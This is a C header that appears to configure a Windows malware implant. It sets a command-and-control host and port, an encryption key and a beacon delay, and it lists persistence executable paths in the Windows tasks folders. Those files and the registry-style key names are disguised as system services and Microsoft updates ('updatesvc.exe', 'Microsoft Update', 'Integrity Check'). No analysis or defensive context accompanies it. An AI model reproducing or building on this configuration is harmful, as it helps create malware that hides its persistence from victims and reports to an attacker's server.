#define c2_host "localhost"
#define c2_port 80
#define encryption_key "skidhunter"
#define delay 5
#define debug 0

char *persistfilenames[] = {
 "C:\\windows\\tasks\\updatesvc.exe",
 "C:\\windows\\system32\\tasks\\microupdate.exe",
 "C:\\windows\\tasks\\syschk.exe",
 "C:\\windows\\system32\\tasks\\integrity.exe",
 "C:\\windows\\tasks\\syssvc.exe"
};

char *keynames[] = {
 "Service Update",
 "Microsoft Update",
 "System Check",
 "Integrity Check",
 "System Service"
};
